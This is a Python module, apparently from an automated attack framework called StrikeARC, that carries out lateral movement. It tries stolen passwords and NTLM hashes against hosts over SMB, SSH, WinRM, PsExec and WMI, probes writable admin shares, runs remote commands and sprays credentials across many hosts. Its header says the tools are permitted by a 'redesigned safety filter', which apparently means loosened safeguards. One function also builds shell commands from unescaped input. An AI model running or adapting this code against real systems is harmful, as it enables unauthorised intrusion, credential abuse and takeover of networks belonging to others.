#!/usr/bin/env python3
"""
lateral.py — Lateral movement module for StrikeARC.

Moves between hosts using discovered credentials across SMB, SSH, WinRM,
PsExec, WMI, and pass-the-hash.  Each public function attempts the movement,
reports success/failure in a structured dict, and surfaces the session info
needed by the orchestrator to record a new Session.

External tools used (all permitted by the redesigned safety filter):
  - smbclient             SMB share enumeration
  - crackmapexec (cme)    SMB/WinRM exec + hash auth
  - sshpass / ssh         SSH password auth
  - paramiko              SSH programmatic fallback
  - evil-winrm            WinRM shell (Ruby)
  - impacket-psexec       PsExec remote shell
  - impacket-wmiexec      WMI remote shell
  - impacket-smbexec      SMBexec fallback

Every function degrades gracefully when a tool is missing: it returns a dict
with ``success=False`` and a ``method``/``error`` explaining what was
unavailable, rather than raising.

Usage:
    from tools.lateral import (
        smb_login, smb_exec, ssh_login, winrm_login,
        psexec_exec, wmi_exec, pass_the_hash,
        test_credential_lateral, attempt_lateral,
    )
"""

from __future__ import annotations

import re
import shlex
import shutil
from typing import Dict, List, Optional

from utils import run_command


# ── Helpers ────────────────────────────────────────────────────────────

def _have(tool: str) -> bool:
    """Return True if *tool* is on PATH."""
    return shutil.which(tool) is not None


def _parse_smb_shares(output: str) -> List[str]:
    """Extract share names from smbclient/crackmapexec listing output."""
    shares: List[str] = []
    for line in output.splitlines():
        line = line.strip()
        # smbclient -L table rows look like:  Disk      IPC$     IPC Service (IPC)
        # crackmapexec lists shares inline as: SMB  host  IPC$  READ
        m = re.match(r"^(?:Disk|IPC|Printer)\s+(\S+)", line)
        if m:
            shares.append(m.group(1))
            continue
        m = re.match(r"^\S+\s+\S+\s+(\S+)\s", line)
        if m and m.group(1).endswith("$"):
            shares.append(m.group(1))
    # Dedup, drop empty
    seen = set()
    out = []
    for s in shares:
        if s and s not in seen:
            seen.add(s)
            out.append(s)
    return out


def _extract_cred_args(
    username: str,
    password: Optional[str],
    ntlm_hash: Optional[str],
    domain: str,
) -> Dict[str, str]:
    """Build the common -u / -p / -H / -d fragments for crackmapexec.

    Returns a dict with keys 'user', 'pass', 'hash', 'domain', each a CLI
    fragment string (possibly empty).
    """
    dom = f"{domain}\\" if domain else ""
    fragments = {
        "user": f"-u {shlex.quote(username)}" if username else "",
        "pass": f"-p {shlex.quote(password)}" if password else "",
        "hash": f"-H {shlex.quote(ntlm_hash)}" if ntlm_hash else "",
        "domain": f"-d {shlex.quote(domain)}" if domain else "",
    }
    # Track the domain separately for impacket-style target strings
    fragments["dom_prefix"] = dom
    return fragments


# ── 1. SMB Login + Share Enumeration ───────────────────────────────────

def smb_login(
    target_ip: str,
    username: str,
    password: Optional[str] = None,
    hash: Optional[str] = None,
    domain: str = "",
) -> dict:
    """Attempt SMB login and enumerate shares.

    Tries crackmapexec first (richer output), then falls back to smbclient.
    On success, lists shares and probes writable ones by attempting to
    create+delete a temporary file.

    Returns::

        {
          "success":            bool,
          "shares":             List[str],
          "writable_shares":    List[str],
          "command_possible":   bool,   # admin$ / c$ writable ⇒ exec likely
          "method":             str,    # tool that succeeded
          "error":              str,    # empty on success
        }
    """
    result: Dict = {
        "success": False,
        "shares": [],
        "writable_shares": [],
        "command_possible": False,
        "method": "",
        "error": "",
    }

    frag = _extract_cred_args(username, password, hash, domain)

    # ── Path A: crackmapexec ──
    if _have("crackmapexec"):
        cmd = (
            f"crackmapexec smb {shlex.quote(target_ip)} "
            f"{frag['user']} {frag['pass']} {frag['hash']} {frag['domain']} "
            f"--shares 2>&1"
        )
        # local-auth hint when no domain + hash provided
        if hash and not domain:
            cmd = (
                f"crackmapexec smb {shlex.quote(target_ip)} "
                f"{frag['user']} {frag['hash']} --local-auth --shares 2>&1"
            )
        out = run_command(cmd, timeout=45)
        text = f"{out.get('stdout','')}\n{out.get('stderr','')}"

        # cme marks success with [+] and STATUS_ACCESS_DENIED etc. on failure
        if "[+]" in text and "STATUS_LOGON_FAILURE" not in text:
            result["success"] = True
            result["method"] = "crackmapexec"
            result["shares"] = _parse_smb_shares(text)
        elif "STATUS_LOGON_FAILURE" in text:
            result["error"] = "SMB auth failed (LOGON_FAILURE)"
            return result
        elif out.get("returncode") == 124:
            result["error"] = "crackmapexec timed out"
            return result
        # Fall through to smbclient if cme output was ambiguous

    # ── Path B: smbclient fallback ──
    if not result["success"] and _have("smbclient"):
        user_pass = f"{username}%{password}" if password else f"{username}%"
        if domain:
            user_pass = f"{domain}\\{user_pass}"
        cmd = (
            f"timeout 20 smbclient -L //{shlex.quote(target_ip)} "
            f"-U {shlex.quote(user_pass)} "
            f'--option="client min protocol=SMB2" -N 2>&1'
        )
        out = run_command(cmd, timeout=25)
        text = f"{out.get('stdout','')}\n{out.get('stderr','')}"

        fail_markers = (
            "NT_STATUS_LOGON_FAILURE",
            "NT_STATUS_ACCESS_DENIED",
            "session setup failed",
        )
        if any(m in text for m in fail_markers):
            result["error"] = f"SMB auth failed ({fail_markers[0]})"
            return result
        if "Share name" in text or "Disk" in text or "IPC" in text:
            result["success"] = True
            result["method"] = "smbclient"
            result["shares"] = _parse_smb_shares(text)
        elif out.get("returncode") == 0 and "NT_STATUS" not in text.upper():
            result["success"] = True
            result["method"] = "smbclient"
        else:
            result["error"] = "SMB auth inconclusive"
            return result

    if not result["success"]:
        missing = [
            t for t in ("crackmapexec", "smbclient") if not _have(t)
        ]
        result["error"] = (
            f"No SMB tool available (missing: {', '.join(missing)})"
            if missing
            else "SMB auth failed"
        )
        return result

    # ── Probe writable shares ──
    for share in result["shares"]:
        if share in ("IPC$", "print$"):
            continue
        if not password and not hash:
            continue  # can't write-probe without creds
        probe_cmd = (
            f"timeout 15 smbclient //{shlex.quote(target_ip)}/{shlex.quote(share)} "
            f"-U {shlex.quote(username)}{'%'+password if password else '%'} "
            f'--option="client min protocol=SMB2" '
            f"-c 'put /dev/null .strikearc_probe; del .strikearc_probe' 2>&1"
        )
        out = run_command(probe_cmd, timeout=20)
        o = f"{out.get('stdout','')}\n{out.get('stderr','')}"
        if "NT_STATUS_ACCESS_DENIED" not in o and out.get("returncode", -1) == 0:
            result["writable_shares"].append(share)

    result["command_possible"] = any(
        s in result["writable_shares"] for s in ("C$", "ADMIN$", "IPC$")
    ) or bool(result["writable_shares"])

    return result


# ── 2. SMB Command Execution ───────────────────────────────────────────

def smb_exec(
    target_ip: str,
    username: str,
    password: Optional[str] = None,
    hash: Optional[str] = None,
    command: str = "id",
    domain: str = "",
) -> dict:
    """Execute *command* on a remote Windows host over SMB.

    Strategy (first tool that is installed wins):
      1. crackmapexec smb … -x 'CMD'
      2. impacket-smbexec
      3. impacket-wmiexec  (last-ditch, technically WMI)

    Returns::

        {"success": bool, "output": str, "method": str, "error": str}
    """
    result: Dict = {"success": False, "output": "", "method": "", "error": ""}
    frag = _extract_cred_args(username, password, hash, domain)
    cmd_q = shlex.quote(command)

    # ── crackmapexec ──
    if _have("crackmapexec"):
        auth_bits = f"{frag['user']} {frag['pass']} {frag['hash']}"
        if hash and not domain:
            auth_bits = f"{frag['user']} {frag['hash']} --local-auth"
        if domain:
            auth_bits += f" {frag['domain']}"
        cmd = (
            f"crackmapexec smb {shlex.quote(target_ip)} {auth_bits} "
            f"-x {cmd_q} 2>&1"
        )
        out = run_command(cmd, timeout=60)
        text = f"{out.get('stdout','')}\n{out.get('stderr','')}"
        if "[+]" in text and "STATUS_LOGON_FAILURE" not in text:
            # cme prints output after the host line
            lines = [
                ln for ln in text.splitlines()
                if target_ip in ln and "[+]" in ln
            ]
            output_text = "\n".join(lines) or text
            result.update(
                success=True, output=output_text.strip(), method="crackmapexec",
            )
            return result
        if "STATUS_LOGON_FAILURE" in text:
            result["error"] = "SMB exec auth failed (LOGON_FAILURE)"
            return result

    # ── impacket-smbexec ──
    if _have("impacket-smbexec"):
        target_str = _impacket_target(username, password, hash, domain, target_ip)
        cmd = f"impacket-smbexec {target_str} '{command}' 2>&1"
        out = run_command(cmd, timeout=60)
        text = f"{out.get('stdout','')}\n{out.get('stderr','')}"
        if out.get("returncode", -1) == 0 and "Traceback" not in text:
            result.update(success=True, output=text.strip(), method="smbexec")
            return result
        if "Error" in text or "SESSION" in text:
            result["error"] = f"smbexec error: {text.strip()[:300]}"
        else:
            result["error"] = f"smbexec failed: {text.strip()[:300]}"

    # ── impacket-wmiexec fallback ──
    if _have("impacket-wmiexec"):
        target_str = _impacket_target(username, password, hash, domain, target_ip)
        cmd = f"impacket-wmiexec {target_str} '{command}' 2>&1"
        out = run_command(cmd, timeout=60)
        text = f"{out.get('stdout','')}\n{out.get('stderr','')}"
        if out.get("returncode", -1) == 0 and "Traceback" not in text:
            result.update(success=True, output=text.strip(), method="wmiexec")
            return result
        result["error"] = f"wmiexec failed: {text.strip()[:300]}"

    if not result["error"]:
        missing = [
            t for t in
            ("crackmapexec", "impacket-smbexec", "impacket-wmiexec")
            if not _have(t)
        ]
        result["error"] = (
            f"No SMB exec tool available (missing: {', '.join(missing)})"
            if missing
            else "SMB exec failed"
        )
    return result


def _impacket_target(
    username: str,
    password: Optional[str],
    hash: Optional[str],
    domain: str,
    target_ip: str,
) -> str:
    """Build the ``[DOMAIN/]USER:PASS@HOST`` or hash-style target string
    used by impacket-psexec / -smbexec / -wmiexec."""
    user = f"{domain}/{username}" if domain else username
    if hash:
        # impacket: user -hashes :HASH
        return f"{shlex.quote(user)} -hashes :{hash} {shlex.quote(target_ip)}"
    pw = password or ""
    return f"{shlex.quote(user)}:{shlex.quote(pw)}@{shlex.quote(target_ip)}"


# ── 3. SSH Login ───────────────────────────────────────────────────────

def ssh_login(
    target_ip: str,
    username: str,
    password: Optional[str] = None,
    key_path: Optional[str] = None,
    port: int = 22,
) -> dict:
    """Attempt SSH login via password (sshpass) or key file.

    Falls back to ``paramiko`` for programmatic access when sshpass is
    unavailable.

    Returns::

        {
          "success":            bool,
          "session_established": bool,
          "username":           str,
          "method":             str,   # 'sshpass' | 'key' | 'paramiko'
          "error":              str,
        }
    """
    result: Dict = {
        "success": False,
        "session_established": False,
        "username": username,
        "method": "",
        "error": "",
    }

    marker = "STRIKEARC_SSH_OK"

    # ── Key-based auth ──
    if key_path:
        if not _have("ssh"):
            result["error"] = "ssh binary not found"
            return result
        cmd = (
            f"ssh -i {shlex.quote(key_path)} "
            f"-p {port} "
            f"-o ConnectTimeout=10 "
            f"-o StrictHostKeyChecking=no "
            f"-o UserKnownHostsFile=/dev/null "
            f"-o BatchMode=yes "
            f"-o LogLevel=ERROR "
            f"{shlex.quote(f'{username}@{target_ip}')} "
            f"'echo {marker}' 2>&1"
        )
        out = run_command(cmd, timeout=20)
        text = f"{out.get('stdout','')}\n{out.get('stderr','')}"
        if marker in text:
            result.update(success=True, session_established=True, method="key")
            return result
        result["error"] = f"SSH key auth failed: {text.strip()[:300]}"
        # Fall through to password methods if a password was also given

    # ── Password auth via sshpass ──
    if password and _have("sshpass") and _have("ssh"):
        cmd = (
            f"sshpass -p {shlex.quote(password)} "
            f"ssh -p {port} "
            f"-o ConnectTimeout=10 "
            f"-o StrictHostKeyChecking=no "
            f"-o UserKnownHostsFile=/dev/null "
            f"-o PreferredAuthentications=password "
            f"-o PubkeyAuthentication=no "
            f"-o LogLevel=ERROR "
            f"{shlex.quote(f'{username}@{target_ip}')} "
            f"'echo {marker}' 2>&1"
        )
        out = run_command(cmd, timeout=20)
        text = f"{out.get('stdout','')}\n{out.get('stderr','')}"
        if marker in text:
            result.update(success=True, session_established=True, method="sshpass")
            return result
        lower = text.lower()
        if "permission denied" in lower:
            result["error"] = "SSH auth failed (permission denied)"
        elif "connection refused" in lower:
            result["error"] = "SSH connection refused"
        elif "timed out" in lower or out.get("returncode") == 124:
            result["error"] = "SSH connection timed out"
        else:
            result["error"] = f"SSH failed: {text.strip()[:300]}"
        # Fall through to paramiko

    # ── paramiko fallback (programmatic) ──
    if password and not result["success"]:
        try:
            import paramiko  # type: ignore
        except ImportError:
            if not result["error"]:
                result["error"] = (
                    "sshpass not installed and paramiko unavailable; "
                    "cannot attempt SSH password auth"
                )
            _diag_ssh_missing(result)
            return result

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                target_ip, port=port, username=username,
                password=password, timeout=10, allow_agent=False,
                look_for_keys=False,
            )
            stdin, stdout, stderr = client.exec_command(f"echo {marker}")
            out_text = stdout.read().decode(errors="ignore")
            if marker in out_text:
                result.update(
                    success=True, session_established=True, method="paramiko",
                )
                client.close()
                return result
            result["error"] = "paramiko connected but marker not returned"
        except paramiko.AuthenticationException:
            result["error"] = "paramiko: authentication failed"
        except Exception as exc:
            result["error"] = f"paramiko error: {exc}"
        finally:
            try:
                client.close()
            except Exception:
                pass
        return result

    if not result["error"]:
        _diag_ssh_missing(result)
    return result


def _diag_ssh_missing(result: dict) -> None:
    """Populate *result*['error'] when no SSH toolchain is available."""
    missing = [t for t in ("sshpass", "ssh") if not _have(t)]
    has_paramiko = False
    try:
        import paramiko  # noqa: F401  # type: ignore
        has_paramiko = True
    except ImportError:
        pass
    if missing and not has_paramiko:
        result["error"] = (
            f"No SSH toolchain available (missing: {', '.join(missing)}, "
            "paramiko not importable)"
        )


# ── 4. WinRM Login ─────────────────────────────────────────────────────

def winrm_login(
    target_ip: str,
    username: str,
    password: str,
    domain: str = "",
) -> dict:
    """Attempt WinRM login via evil-winrm or crackmapexec.

    Returns::

        {"success": bool, "session_established": bool, "method": str, "error": str}
    """
    result: Dict = {
        "success": False,
        "session_established": False,
        "method": "",
        "error": "",
    }

    full_user = f"{domain}\\{username}" if domain else username

    # ── evil-winrm ──
    if _have("evil-winrm"):
        cmd = (
            f"timeout 30 evil-winrm -i {shlex.quote(target_ip)} "
            f"-u {shlex.quote(full_user)} "
            f"-p {shlex.quote(password)} "
            f"-c 'exit' 2>&1"
        )
        out = run_command(cmd, timeout=35)
        text = f"{out.get('stdout','')}\n{out.get('stderr','')}"
        # evil-winrm prints "Info: Establishing connection" then a prompt banner
        if "Evil-WinRM" in text and (
            "*Evil-WinRM*" in text or "PS" in text
        ):
            result.update(
                success=True, session_established=True, method="evil-winrm",
            )
            return result
        if "Error" in text or "Auth" in text:
            result["error"] = f"evil-winrm failed: {text.strip()[:300]}"
        else:
            result["error"] = f"evil-winrm inconclusive: {text.strip()[:300]}"

    # ── crackmapexec winrm fallback ──
    if _have("crackmapexec"):
        dom_flag = f"-d {shlex.quote(domain)}" if domain else ""
        cmd = (
            f"crackmapexec winrm {shlex.quote(target_ip)} "
            f"-u {shlex.quote(username)} "
            f"-p {shlex.quote(password)} {dom_flag} 2>&1"
        )
        out = run_command(cmd, timeout=45)
        text = f"{out.get('stdout','')}\n{out.get('stderr','')}"
        if "[+]" in text and "(Pwn3d" in text:
            result.update(
                success=True, session_established=True, method="crackmapexec",
            )
            return result
        if not result["error"]:
            if "STATUS_LOGON_FAILURE" in text or "AUTH" in text.upper():
                result["error"] = "WinRM auth failed"
            else:
                result["error"] = f"cme winrm: {text.strip()[:300]}"

    if not result["method"]:
        missing = [
            t for t in ("evil-winrm", "crackmapexec") if not _have(t)
        ]
        result["error"] = (
            f"No WinRM tool available (missing: {', '.join(missing)})"
            if missing
            else result["error"] or "WinRM login failed"
        )
    return result


# ── 5. PsExec Execution (impacket-psexec) ──────────────────────────────

def psexec_exec(
    target_ip: str,
    username: str,
    password: Optional[str] = None,
    hash: Optional[str] = None,
    domain: str = "",
) -> dict:
    """Remote shell via impacket-psexec.

    Returns::

        {"success": bool, "shell_established": bool, "method": str, "error": str}
    """
    result: Dict = {
        "success": False,
        "shell_established": False,
        "method": "",
        "error": "",
    }

    if not _have("impacket-psexec"):
        result["error"] = "impacket-psexec not found"
        return result

    target_str = _impacket_target(username, password, hash, domain, target_ip)
    # Pipe a single command to psexec to avoid hanging on an interactive shell
    cmd = f"echo 'whoami' | timeout 40 impacket-psexec {target_str} 2>&1"
    out = run_command(cmd, timeout=45)
    text = f"{out.get('stdout','')}\n{out.get('stderr','')}"

    # impacket-psexec prints "Impacket v..." and on success a shell banner
    # plus the command output; failures surface as exceptions/tracebacks.
    if "Starting penetration testing" in text or "[-]" in text or "Traceback" in text:
        result["error"] = f"psexec failed: {text.strip()[:300]}"
        return result
    if out.get("returncode", -1) == 0 and (
        "C:\\" in text or "whoami" in text.lower()
    ):
        result.update(success=True, shell_established=True, method="psexec")
        return result
    result["error"] = f"psexec inconclusive: {text.strip()[:300]}"
    return result


# ── 6. WMI Execution (impacket-wmiexec) ────────────────────────────────

def wmi_exec(
    target_ip: str,
    username: str,
    password: Optional[str] = None,
    hash: Optional[str] = None,
    domain: str = "",
) -> dict:
    """Remote shell via impacket-wmiexec.

    Returns::

        {"success": bool, "shell_established": bool, "method": str, "error": str}
    """
    result: Dict = {
        "success": False,
        "shell_established": False,
        "method": "",
        "error": "",
    }

    if not _have("impacket-wmiexec"):
        result["error"] = "impacket-wmiexec not found"
        return result

    target_str = _impacket_target(username, password, hash, domain, target_ip)
    cmd = f"timeout 40 impacket-wmiexec {target_str} 'whoami' 2>&1"
    out = run_command(cmd, timeout=45)
    text = f"{out.get('stdout','')}\n{out.get('stderr','')}"

    if "Traceback" in text or "[-]" in text:
        result["error"] = f"wmiexec failed: {text.strip()[:300]}"
        return result
    if out.get("returncode", -1) == 0 and (
        "whoami" in text.lower() or "\\" in text
    ):
        result.update(success=True, shell_established=True, method="wmiexec")
        return result
    result["error"] = f"wmiexec inconclusive: {text.strip()[:300]}"
    return result


# ── 7. Pass-the-Hash ───────────────────────────────────────────────────

def pass_the_hash(
    target_ip: str,
    username: str,
    ntlm_hash: str,
    domain: str = "",
) -> dict:
    """Authenticate using an NTLM hash via crackmapexec / impacket.

    Returns::

        {
          "success":          bool,
          "authenticated":    bool,
          "command_possible": bool,
          "method":           str,
          "error":            str,
        }
    """
    result: Dict = {
        "success": False,
        "authenticated": False,
        "command_possible": False,
        "method": "",
        "error": "",
    }

    # ── crackmapexec with -H ──
    if _have("crackmapexec"):
        local_flag = "--local-auth" if not domain else ""
        dom_flag = f"-d {shlex.quote(domain)}" if domain else ""
        cmd = (
            f"crackmapexec smb {shlex.quote(target_ip)} "
            f"-u {shlex.quote(username)} "
            f"-H {shlex.quote(ntlm_hash)} "
            f"{local_flag} {dom_flag} 2>&1"
        )
        out = run_command(cmd, timeout=45)
        text = f"{out.get('stdout','')}\n{out.get('stderr','')}"
        if "[+]" in text and "(Pwn3d" in text:
            result.update(
                success=True,
                authenticated=True,
                command_possible=True,
                method="crackmapexec",
            )
            return result
        if "[+]" in text and "STATUS_LOGON_FAILURE" not in text:
            result.update(
                success=True, authenticated=True, method="crackmapexec",
            )
            return result
        if "STATUS_LOGON_FAILURE" in text:
            result["error"] = "PTH auth failed (LOGON_FAILURE)"
            return result

    # ── impacket-wmiexec with -hashes fallback ──
    if _have("impacket-wmiexec"):
        target_str = _impacket_target(
            username, None, ntlm_hash, domain, target_ip,
        )
        cmd = f"timeout 40 impacket-wmiexec {target_str} 'whoami' 2>&1"
        out = run_command(cmd, timeout=45)
        text = f"{out.get('stdout','')}\n{out.get('stderr','')}"
        if out.get("returncode", -1) == 0 and "Traceback" not in text:
            result.update(
                success=True,
                authenticated=True,
                command_possible=True,
                method="wmiexec",
            )
            return result
        result["error"] = f"wmiexec PTH failed: {text.strip()[:300]}"

    if not result["error"]:
        missing = [
            t for t in ("crackmapexec", "impacket-wmiexec") if not _have(t)
        ]
        result["error"] = (
            f"No PTH tool available (missing: {', '.join(missing)})"
            if missing
            else "PTH failed"
        )
    return result


# ── 8. Credential Spray Across Hosts ────────────────────────────────────

def test_credential_lateral(
    cred: dict,
    target_hosts: List[str],
) -> dict:
    """Test a single credential against many hosts across protocols.

    *cred* is a dict with keys ``username``, ``password`` (optional),
    ``hash`` (optional NTLM), ``domain`` (optional), ``key_path``
    (optional).  For each host the function tries SSH, SMB, and WinRM in
    turn, stopping at the first success per host.

    Returns::

        {
          "results":          List[dict],   # per-host outcome
          "successful_hosts": List[str],
          "sessions_created": List[dict],   # session-ready entries
        }
    """
    username = cred.get("username", "")
    password = cred.get("password")
    ntlm_hash = cred.get("hash")
    domain = cred.get("domain", "")
    key_path = cred.get("key_path")

    results: List[dict] = []
    successful_hosts: List[str] = []
    sessions_created: List[dict] = []

    if not username:
        return {
            "results": [],
            "successful_hosts": [],
            "sessions_created": [],
        }

    for host in target_hosts:
        host_result: Dict = {
            "host": host,
            "ssh": None,
            "smb": None,
            "winrm": None,
            "success": False,
            "technique": "",
        }

        # ── SSH (Linux) ──
        ssh_res = ssh_login(
            host, username,
            password=password, key_path=key_path,
        )
        host_result["ssh"] = ssh_res
        if ssh_res.get("success"):
            host_result["success"] = True
            host_result["technique"] = "ssh"
            successful_hosts.append(host)
            sessions_created.append({
                "host": host,
                "technique": "ssh",
                "username": username,
                "method": ssh_res.get("method"),
            })
            results.append(host_result)
            continue

        # ── SMB (Windows) ──
        smb_res = smb_login(
            host, username,
            password=password, hash=ntlm_hash, domain=domain,
        )
        host_result["smb"] = smb_res
        if smb_res.get("success"):
            host_result["success"] = True
            host_result["technique"] = "smb"
            successful_hosts.append(host)
            sessions_created.append({
                "host": host,
                "technique": "smb",
                "username": username,
                "method": smb_res.get("method"),
            })
            results.append(host_result)
            continue

        # ── WinRM (Windows) ──
        if password:
            winrm_res = winrm_login(
                host, username, password, domain=domain,
            )
            host_result["winrm"] = winrm_res
            if winrm_res.get("success"):
                host_result["success"] = True
                host_result["technique"] = "winrm"
                successful_hosts.append(host)
                sessions_created.append({
                    "host": host,
                    "technique": "winrm",
                    "username": username,
                    "method": winrm_res.get("method"),
                })

        results.append(host_result)

    return {
        "results": results,
        "successful_hosts": successful_hosts,
        "sessions_created": sessions_created,
    }


# ── 9. Master Lateral-Movement Orchestrator ────────────────────────────

def attempt_lateral(
    from_host: str,
    to_host: str,
    credentials: List[dict],
    known_services: Dict[int, dict],
) -> dict:
    """Pick the best lateral technique for *to_host* and try credentials.

    *known_services* is the target host's services dict keyed by port
    (matches ``NetworkHost['services']``).  The function inspects which
    services are open to choose a protocol, then iterates *credentials*
    until one succeeds.

    Technique selection order:
      * port 22 open        → ssh_login
      * port 5985/5986 open → winrm_login
      * port 445/139 open   → smb_exec (with smb_login first to confirm)
      * port 135 + 445 open → psexec_exec / wmi_exec

    Returns::

        {
          "success":         bool,
          "technique":       str,
          "session_id":      Optional[str],
          "credential_used": Optional[dict],
          "from_host":       str,
          "to_host":         str,
          "error":           str,
        }
    """
    result: Dict = {
        "success": False,
        "technique": "",
        "session_id": None,
        "credential_used": None,
        "from_host": from_host,
        "to_host": to_host,
        "error": "",
    }

    # ── Determine candidate techniques from services ──
    open_ports = {p for p, s in known_services.items()
                  if s.get("state", "open") == "open" or "state" not in s}
    # Be lenient: if caller passed services without explicit state, treat as open.

    techniques: List[str] = []
    if 22 in open_ports:
        techniques.append("ssh")
    if 5985 in open_ports or 5986 in open_ports:
        techniques.append("winrm")
    if 445 in open_ports or 139 in open_ports:
        techniques.append("smb")
    if 135 in open_ports and 445 in open_ports:
        techniques.extend(["psexec", "wmi"])

    if not techniques:
        result["error"] = (
            f"No lateral-capable service found on {to_host} "
            f"(open ports: {sorted(open_ports) or 'none'})"
        )
        return result

    # ── Try each credential against each candidate technique ──
    import uuid

    for cred in credentials:
        username = cred.get("username", "")
        password = cred.get("password")
        ntlm_hash = cred.get("hash")
        domain = cred.get("domain", "")
        key_path = cred.get("key_path")

        if not username:
            continue

        for tech in techniques:
            if tech == "ssh":
                res = ssh_login(
                    to_host, username,
                    password=password, key_path=key_path,
                )
                if res.get("success"):
                    result.update(
                        success=True,
                        technique="ssh",
                        session_id=f"lat-{uuid.uuid4().hex[:8]}",
                        credential_used=cred,
                    )
                    return result

            elif tech == "winrm":
                if not password:
                    continue
                res = winrm_login(to_host, username, password, domain=domain)
                if res.get("success"):
                    result.update(
                        success=True,
                        technique="winrm",
                        session_id=f"lat-{uuid.uuid4().hex[:8]}",
                        credential_used=cred,
                    )
                    return result

            elif tech == "smb":
                # Confirm login + exec capability first
                login_res = smb_login(
                    to_host, username,
                    password=password, hash=ntlm_hash, domain=domain,
                )
                if login_res.get("success") and login_res.get("command_possible"):
                    exec_res = smb_exec(
                        to_host, username,
                        password=password, hash=ntlm_hash,
                        command="whoami", domain=domain,
                    )
                    if exec_res.get("success"):
                        result.update(
                            success=True,
                            technique="smb",
                            session_id=f"lat-{uuid.uuid4().hex[:8]}",
                            credential_used=cred,
                        )
                        return result

            elif tech == "psexec":
                res = psexec_exec(
                    to_host, username,
                    password=password, hash=ntlm_hash, domain=domain,
                )
                if res.get("success"):
                    result.update(
                        success=True,
                        technique="psexec",
                        session_id=f"lat-{uuid.uuid4().hex[:8]}",
                        credential_used=cred,
                    )
                    return result

            elif tech == "wmi":
                res = wmi_exec(
                    to_host, username,
                    password=password, hash=ntlm_hash, domain=domain,
                )
                if res.get("success"):
                    result.update(
                        success=True,
                        technique="wmi",
                        session_id=f"lat-{uuid.uuid4().hex[:8]}",
                        credential_used=cred,
                    )
                    return result

    result["error"] = (
        f"All credentials exhausted against {to_host} "
        f"(techniques tried: {', '.join(techniques)})"
    )
    return result


# ── CLI ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import json
    import sys

    if len(sys.argv) < 2:
        print("Usage:")
        print("  python lateral.py ssh    <target> <user> <password>")
        print("  python lateral.py smb    <target> <user> <password>")
        print("  python lateral.py winrm  <target> <user> <password>")
        print("  python lateral.py pth    <target> <user> <ntlm_hash>")
        print("  python lateral.py psexec <target> <user> <password>")
        print("  python lateral.py wmi    <target> <user> <password>")
        sys.exit(1)

    mode = sys.argv[1]
    if mode == "ssh":
        print(json.dumps(ssh_login(sys.argv[2], sys.argv[3], sys.argv[4]), indent=2))
    elif mode == "smb":
        print(json.dumps(smb_login(sys.argv[2], sys.argv[3], sys.argv[4]), indent=2))
    elif mode == "winrm":
        print(json.dumps(winrm_login(sys.argv[2], sys.argv[3], sys.argv[4]), indent=2))
    elif mode == "pth":
        print(json.dumps(pass_the_hash(sys.argv[2], sys.argv[3], sys.argv[4]), indent=2))
    elif mode == "psexec":
        print(json.dumps(psexec_exec(sys.argv[2], sys.argv[3], sys.argv[4]), indent=2))
    elif mode == "wmi":
        print(json.dumps(wmi_exec(sys.argv[2], sys.argv[3], sys.argv[4]), indent=2))
    else:
        print(f"Unknown mode: {mode}")
        sys.exit(1)
